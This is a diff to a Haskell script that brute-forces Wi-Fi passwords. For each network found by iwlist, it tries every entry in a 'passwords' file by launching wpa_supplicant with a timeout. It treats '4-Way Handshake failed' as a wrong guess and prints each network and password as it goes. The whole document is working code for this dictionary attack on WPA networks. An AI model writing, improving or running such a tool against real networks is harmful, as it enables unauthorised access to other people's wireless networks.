@@ -12,30 +12,31 @@ import Control.Arrow
 import Data.Maybe
 import Data.Text
 import Data.Text.IO
-import Prelude (IO, (.), ($), fmap, Eq (..), Show (..), return, sequence, (>>=), Bool (..), otherwise)
+import Prelude (IO, (.), ($), fmap, Eq (..), Show (..), return, sequence, (>>), (>>=), Bool (..), otherwise, Int)
 import qualified Prelude (filter, dropWhile, take)
 import Shelly
 default (Text)
 
-data Status = Right | Wrong | Error | Proceed deriving (Eq, Show)
+data Status = Right Text | Wrong Text | Error Text | Proceed Text deriving (Eq, Show)
 
 main :: IO ()
 main = do
+    putStrLn "--- scan initiated ---"
     runner "ip" ["link", "set", "eno1", "up"]
     networks <- iwlist
     passwords <- (fmap lines) . readFile $ "passwords"
-
-    putStr $ unlines networks
 
     results <- sequence [ innerLoop network password
                         | network <- networks
                         , password <- passwords
                         ]
-    return ()
+    putStrLn "--- scan completed ---"
 
 
 innerLoop :: Text -> Text -> IO Text
-innerLoop network password = conf network password >>= supplicant
+innerLoop network password = report >> conf network password >>= supplicant
+    where
+    report = putStr . concat $ [ "[ ", network, " ] [ ", password, " ] -- " ]
 
 runner cmd args = shelly . silently $ run cmd args
 
@@ -53,31 +54,36 @@ iwlist = fmap parse output
         >>> fmap (drop 1 >>> dropEnd 1)
 
 supplicant :: Text -> IO Text
-supplicant conf = shelly . (errExit False) $ do
-    log <- fmap lines $ run "wpa_supplicant"
-        [ "-P", "/run/wpa_supplicant_eno1.pid"
+supplicant conf = shelly . silently . (errExit False) $ do
+    log <- fmap lines $ run "timeout"
+        [ (pack.show) (10::Int)
+        , "wpa_supplicant"
+        , "-P", "/run/wpa_supplicant_eno1.pid"
         , "-i", "eno1"
         , "-D", "wext"
         , "-C", "/run/wpa_supplicant"
         , "-c", conf
         ]
-    return $ evaluateInput log
+    echo (evaluateInput log)
+    return (evaluateInput log)
 
     where
     evaluateInput :: [Text] -> Text
     evaluateInput = fmap strategy
         >>> Prelude.take 10
-        >>> Prelude.dropWhile (== Proceed)
+        >>> Prelude.dropWhile (isProceed)
         >>> listToMaybe
         >>> maybe "No result!" (pack.show)
 
+    isProceed (Proceed _) = True
+    isProceed _ = False
 
     strategy :: Text -> Status
     strategy message
-        | "4-Way Handshake failed" `isInfixOf` message = Wrong
-        | "timed out" `isInfixOf` message = Error
-        | "Association request to the driver failed" `isInfixOf` message = Error
-        | otherwise = Proceed
+        | "4-Way Handshake failed" `isInfixOf` message = Wrong message
+        | "timed out" `isInfixOf` message = Error message
+        | "Association request to the driver failed" `isInfixOf` message = Error message
+        | otherwise = Proceed message
 
 conf :: Text -> Text -> IO Text
 conf network password = do
